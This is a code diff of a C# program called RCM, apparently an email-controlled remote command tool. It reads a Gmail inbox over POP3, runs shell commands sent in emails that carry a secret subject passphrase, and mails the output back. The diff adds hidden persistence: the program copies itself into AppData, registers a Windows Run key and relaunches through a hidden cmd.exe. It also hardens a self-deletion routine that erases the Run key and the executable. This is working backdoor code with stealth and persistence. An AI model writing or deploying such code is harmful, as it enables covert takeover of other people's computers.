@@ -1,8 +1,11 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Net.Mail;
 using System.Reflection;
+using System.Security;
+using System.Security.Permissions;
 using System.Threading;
 using Microsoft.Win32;
 using OpenPop.Mime;
@@ -14,6 +17,9 @@ namespace RCM
     {
         static void Main(string[] args)
         {
+            //make me autorun
+            bool autorun = true;
+
             //podatki o email racunu
             string username = "USERNAME@gmail.com";
             string password = "PASSWORD";
@@ -68,6 +74,12 @@ namespace RCM
              * Source... do not change!
              * 
              */
+
+            if (autorun)
+            {
+                autoStart();
+            }
+
             Console.Beep();
             Console.WriteLine("Start listening on " + username);
             Console.WriteLine("Secret passphrase in Subject is set to: " + secret);
@@ -142,23 +154,130 @@ namespace RCM
             }
         }
 
+        private static void autoStart()
+        {
+            string exepath = Assembly.GetEntryAssembly().Location;
+            string path = Path.GetDirectoryName(exepath); //mapa iz katere je zagnan program
+
+            //C:\Users\Uporabnik\AppData\Local
+            string userPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            string toRun = userPath + @"\RCM";
+
+            //target path:
+            string target = toRun + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName;
+
+            if (path == toRun)
+            {
+                //datoteka je v pravem fajlu
+                //C:\Users\Uporabnik\AppData\Local\RCM
+                if (checkWritableKey())
+                {
+                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    rk.SetValue(System.Diagnostics.Process.GetCurrentProcess().ProcessName, path + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe");
+                }
+            }
+            else
+            {
+                if (IsDirectoryWritable(userPath))
+                {
+                    //create RCM folder
+                    if (!Directory.Exists(toRun))
+                    {
+                        Directory.CreateDirectory(toRun);
+                    }
+                    //copy OpenPop and myself to toRUn
+                    try
+                    {
+                        //copy OpenPop
+                        File.Copy(path + @"\OpenPop.dll", toRun + @"\OpenPop.dll");
+
+                    }
+                    catch {  }
+
+                    try
+                    {
+                        File.Copy(path + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe", toRun + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe");
+                    }
+                    catch {  }
+
+                    //zapisemo se v registre
+                    if (checkWritableKey())
+                    {
+                        RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        rk.SetValue(System.Diagnostics.Process.GetCurrentProcess().ProcessName, toRun + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe");
+                    }
+                    //start new one,
+                    //kill my self
+                    var info = new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & start \"\" \"" + toRun + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe\"");
+                    info.WindowStyle = ProcessWindowStyle.Hidden;
+                    Process.Start(info).Dispose();
+                    Environment.Exit(0);
+                }
+            }
+
+        }
+
+
         private static void DestroyMe()
         {
             //delete autorun keys
-            string appName = System.Diagnostics.Process.GetCurrentProcess().ProcessName; //RCM by default
+            try
+            {
+                string appName = System.Diagnostics.Process.GetCurrentProcess().ProcessName; //RCM by default
 
-            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            rk.DeleteValue(appName, false);
+                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                rk.DeleteValue(appName, false);
+            }
+            catch { }
 
             //delete RCM.exe
-            var exepath = Assembly.GetEntryAssembly().Location;
-            var info = new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + exepath + "\"");
-            info.WindowStyle = ProcessWindowStyle.Hidden;
-            Process.Start(info).Dispose();
-            Environment.Exit(0);
+            try
+            {
+                var exepath = Assembly.GetEntryAssembly().Location;
+                var info = new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + exepath + "\"");
+                info.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(info).Dispose();
+                Environment.Exit(0);
+            }
+            catch { }
         }
 
-        public static List<Message> FetchAllMessages(string hostname, int port, bool useSsl, string username, string password)
+        private static bool IsDirectoryWritable(string dirPath)
+        {
+            try
+            {
+                using (FileStream fs = File.Create(
+                    Path.Combine(
+                        dirPath,
+                        Path.GetRandomFileName()
+                    ),
+                    1,
+                    FileOptions.DeleteOnClose)
+                )
+                { }
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        private static bool checkWritableKey()
+        {
+            try
+            {
+                RegistryPermission r = new RegistryPermission(RegistryPermissionAccess.Write, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
+                r.Demand();
+                return true;
+            }
+            catch (SecurityException)
+            {
+                return false;
+            }
+        }
+
+        private static List<Message> FetchAllMessages(string hostname, int port, bool useSsl, string username, string password)
         {
             // The client disconnects from the server when being disposed
             using (Pop3Client client = new Pop3Client())
@@ -188,7 +307,7 @@ namespace RCM
             }
         }
 
-        public static bool DeleteMessageByMessageId(string hostname, int port, bool useSsl, string username, string password, string messageId)
+        private static bool DeleteMessageByMessageId(string hostname, int port, bool useSsl, string username, string password, string messageId)
         {
             using (Pop3Client client = new Pop3Client())
             {
@@ -218,7 +337,7 @@ namespace RCM
             }
         }
 
-        public static bool SendOutputBackToSender(string username, string password, string sender, string outHost, int outPort, string outBody,bool enableOutSsl)
+        private static bool SendOutputBackToSender(string username, string password, string sender, string outHost, int outPort, string outBody, bool enableOutSsl)
         {
             try
             {
@@ -244,7 +363,7 @@ namespace RCM
             }
         }
 
-        public static string runCMD_Feedback(string command)
+        private static string runCMD_Feedback(string command)
         {
             string output = "";
 
@@ -267,7 +386,7 @@ namespace RCM
             return output;
         }
 
-        public static void runCMD_NoFeedback(string command)
+        private static void runCMD_NoFeedback(string command)
         {
             System.Diagnostics.Process process = new System.Diagnostics.Process();
             System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
